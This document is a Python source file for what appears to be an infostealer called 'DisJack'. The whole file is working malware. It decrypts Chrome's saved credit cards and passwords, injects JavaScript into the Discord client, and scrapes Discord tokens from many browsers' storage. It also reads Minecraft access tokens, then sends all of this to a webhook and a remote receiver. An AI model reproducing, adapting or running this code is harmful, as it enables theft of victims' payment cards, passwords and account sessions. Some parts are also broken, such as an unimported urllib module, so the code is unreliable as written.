import ctypes, os, subprocess, time, re, requests, sys, sqlite3, win32crypt, shutil, json, random, string
from colorama import Fore
try: import PyChromeDevTools
except ImportError: os.system('pip3 install PyChromeDevTools'); os.system('py -m pip install PyChromeDevTools'); import PyChromeDevTools

webhook = '' # Discord webhook or smth
website = '' # Website to redirect to when finished 

###############################
# Look at index.php in /server
credRec = ''
###############################

debug = False

class Sender:
	def __init__(self, url):
		self.url = url

	def send(self, data):
		req = urllib.request.Request(self.url)

		jsondata = json.dumps(data)
		reqbytes = jsondata.encode("utf-8")

		req.add_header("Content-Type","application/json; charser=utf-8")
		req.add_header("Content-Length",len(reqbytes))
		req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
		urllib.request.urlopen(req, reqbytes)

class SQLite3Connection:
	def __init__(self, path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			pass

	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()

	def close(self):
		self.connection.close()

class SQLite3LockedConnection:
	def __init__(self,path):
		self.path = shutil.copy(path,os.getcwd() + "\\" + "".join(random.choice(string.ascii_uppercase)) +".bak")
		self.connection = SQLite3Connection(self.path)
	def run(self,query):
		return self.connection.run(query)
	def close(self):
		self.connection.close()
		os.remove(self.path)

class CardStealer:
	def __init__(self):
		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")

	def steal(self):
		data = self.connection.run("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		stolen = []
		if len(data) > 0:
			for result in data:
				cardname = result[0]
				expirationmonth = result[1]
				expirationyear = result[2]
				try:
					cardnumber = win32crypt.CryptUnprotectData(result[3],None,None,None,0)
				except:
					pass
				if cardnumber:
					stolen.append({
						"cardname": cardname,
						"expirationdate": str(expirationmonth) + "/" + str(expirationyear),
						"cardnumber": cardnumber[1].decode()
					})
		else:
			return None

		self.connection.close()
		return stolen

class PasswordStealer:
	def __init__(self):
		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
	def steal(self):
		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
		stolen = []
		if len(data) > 0:
			for result in data:
				url = result[0]
				username = result[1]
				try:
					password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)
				except:
					pass
				if password:
					stolen.append({
						"url": url,
						"username": username,
						"password": password[1].decode()
					})
		else:
			return None
		self.connection.close()
		return stolen

def getLocations():
    username = os.environ.get('username')

    if os.name == 'nt':
        locations = [
            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
        ]
        
    else:
        locations = [
            f'\\home\\{username}\\.minecraft\\launcher_accounts.json',
            f'\\sdcard\\games\\com.mojang\\',
            f'\\~\\Library\\Application Support\\minecraft'
            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
        ]

    return locations

def MinecraftStealer():
    accounts = []
    for location in getLocations():
        if os.path.exists(location):
            auth_db = json.loads(open(location).read())['accounts']

            for d in auth_db:
                sessionKey = auth_db[d].get('accessToken')
                username = auth_db[d].get('minecraftProfile')['name']
                sessionType = auth_db[d].get('type')
                email = auth_db[d].get('username')
                if sessionKey != None or '':
                    accounts.append([username, sessionType, email, sessionKey])

    return accounts

def illegal():
    sender = Sender(credRec)

    cs = CardStealer()
    ps = PasswordStealer()
    sc = cs.steal()
    sp = ps.steal()

    data = {"from": "DisJack"}

    if sc:
        data["credit_cards"] = sc
    if sp:
        data["passwords"] = sp

    sender.send(data)

def isAdmin():
    try: AdminStatus = os.getuid() == 0
    except AttributeError: AdminStatus = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if debug:
        print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Admin: {AdminStatus}')
    return AdminStatus

def RunCMD(command, wait = False):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    if wait: process.wait()
    if debug:
        print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Ran Command: {command}')

def inject(location):
    script = open('injection.js', 'r').read()
    f = open(str(location), 'w')
    f.write(f'''module.exports = require('./core.asar');
{script}
''')
    f.close()

def findEnd(userName):
    RunCMD('wmic process where name=\'Discord.exe\' delete', True)

    versions = []

    for x in os.listdir('C:\\Users\\' + userName + '\AppData\Local\Discord'):
        if x.startswith("app-"):
            if debug:
                print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Scanning: {x} | {x[4:]}')
            versions.append(x[4:])

    versions.sort(key = lambda x: int(x.replace(".", "")))
    latestVersion = "app-" + versions[len(versions) - 1]

    inject(f'C:\\Users\\{userName}\AppData\Local\Discord\\{latestVersion}\modules\discord_desktop_core-1\discord_desktop_core\index.js')
    time.sleep(2)

    RunCMD(f'C:\\Users\\{userName}\AppData\Local\Discord\\{latestVersion}\Discord.exe --remote-debugging-port=9223')


def ScrapeTokens(roaming):
    tokens = []
    crawl = {
        'Discord': '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': roaming + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': roaming + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': roaming + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': roaming + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': roaming + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': roaming + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': roaming + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': roaming + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': roaming + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': roaming + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': roaming + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
        'Uran': roaming + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }

    for source, path in crawl.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in ('[\w-]{24}\.[\w-]{6}\.[\w-]{27}', 'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token in tokens:
                            continue
                        if debug:
                            print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Found Token: {path}')
                        tokens.append(token)
    
    return tokens

def replacePage():
    chrome = PyChromeDevTools.ChromeInterface(port=9223)
    chrome.Page.navigate(url=str(website))

def main():
    if isAdmin():
        pass

    illegal()

    findEnd(
        os.environ.get('username')
    )
    
    scrapedTokens = ScrapeTokens(
        os.getenv('APPDATA')
    )

    minecraftCreds = MinecraftStealer()

    replacePage()

    message = f'''
User: {os.environ.get('username')}
Client Deface: True
Tokens: ```json\n{scrapedTokens}\n```
'''

    r = requests.post(
        url=webhook,
        data = {
        'content': f'''
            User: {os.environ.get('username')}
            Client Deface: True
            Tokens: ```json\n{scrapedTokens}\n```
            Minecraft Accounts: ```json\n{minecraftCreds}\n```
        '''
        }
    )
    
if __name__ == '__main__':
    main()
